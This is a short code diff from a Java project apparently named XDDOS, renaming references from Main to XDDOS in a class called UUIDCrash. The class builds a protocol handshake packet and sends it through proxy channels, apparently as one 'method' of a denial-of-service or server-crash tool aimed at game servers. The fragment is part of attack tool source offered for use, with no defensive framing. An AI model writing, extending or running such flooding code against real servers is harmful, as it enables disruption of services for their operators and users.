@@ -3,7 +3,7 @@ package XD.XDDOS.methods;
 import java.io.IOException;
 import java.security.SecureRandom;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.LoginRequest;
@@ -19,7 +19,7 @@ public class UUIDCrash
 implements Method{
 
     final int a = Integer.parseInt(System.getProperty("len", "25555"));
-    private byte[] handshake = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2)).getWrappedPacket();
+    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
 
     public void accept(Channel channel, ProxyLoader.Proxy proxy) {
         channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
